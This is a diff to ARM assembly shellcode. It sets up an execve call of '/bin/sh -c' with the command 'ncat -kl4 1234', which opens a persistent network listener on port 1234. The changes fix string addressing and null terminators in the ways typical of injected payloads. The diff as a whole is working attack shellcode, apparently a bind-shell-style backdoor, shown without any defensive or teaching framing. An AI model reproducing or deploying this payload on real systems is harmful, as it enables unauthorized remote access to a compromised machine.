@@ -21,11 +21,11 @@ _start:
     adr    r0, sh         // r0 = "/bin/sh"
     strb   r2, [r0, #7]   // add null terminator
     
-    add    r1, r0, #8     // r1 = "-c"
+    adr    r1, c_arg      // r1 = "-c"
     strb   r2, [r1, #2]   // add null terminator
 
-    add    r3, r1, #4     // r3 = cmd
-    strb   r2, [r3, #12]
+    adr    r3, cmd        // r3 = cmd
+    strb   r2, [r3, #13]
     
     push   {r0, r1, r3, r2}
     mov    r1, sp         // r1 = argv
@@ -33,6 +33,8 @@ _start:
     svc    1
     nop                   // align by 4 bytes   
 sh:    
-.ascii "/bin/shX-cXX"
+.ascii "/bin/shX"
+c_arg:
+.ascii "-cXX"
 cmd:
 .ascii "ncat -kl4 1234XX" // listen on port 1234
